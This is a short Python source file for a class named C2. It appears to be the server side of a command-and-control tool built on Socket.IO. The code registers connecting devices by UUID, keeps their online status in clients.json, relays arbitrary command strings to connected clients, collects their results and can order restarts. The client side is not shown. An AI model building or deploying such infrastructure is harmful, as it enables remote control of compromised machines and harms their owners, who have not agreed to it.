import json

class C2:
    def __init__(self, sio):
        self.sio = sio
        self.devices = {}
        self.total_devices = {}
        with open("clients.json", 'r') as f:
            self.total_devices = json.load(f)
        for device in self.total_devices:
            self.total_devices[device]['status'] = 'Offline'
        self.sio.on('mConnect', self.on_connect)
        self.sio.on('disconnect', self.on_disconect)
        self.sio.on('command', self.send_command)
        self.sio.on('result', self.get_result)


    def on_connect(self, sid, data):
        print(f"New device connected with sid {sid}")
        if data['uuid'] not in self.devices:
            data['sid'] = sid
            self.devices.update({data['uuid']: data})
            self.total_devices.update({data['uuid']: data})

        self.update_json()


    def on_disconect(self, sid):
        print(f"Device disconnected with sid {sid}")
        for device in self.devices:
            if sid == self.devices[device]["sid"]:
                self.devices.pop(device)
                break
        self.update_json()

    def list_devices(self):
        return self.devices

    def delete_device(self, device_id):
        self.total_devices.pop(device_id)
        if device_id in self.devices:
            self.devices.pop(device_id)

        self.update_json()

    def list_all_devices(self):
        return self.total_devices


    def send_command(self, sid, data):
        self.sio.emit('command', {"id": data['id'], 'cmd': data['cmd']})

    def get_result(self, sid, data):
        for device in self.devices:
            if self.devices[device]['sid'] == sid:
                self.sio.emit('result', {"id": device, 'result': data})
                break

    def ctrl(self, data):
        self.sio.emit('restart', data)

    def update_json(self):
        for device in self.total_devices:
            if device not in self.devices:
                self.total_devices[device]['status'] = 'Offline'
            else:
                self.total_devices[device]['status'] = 'Online'
                
        with open("clients.json", "w") as f:
            json.dump(self.total_devices, f)


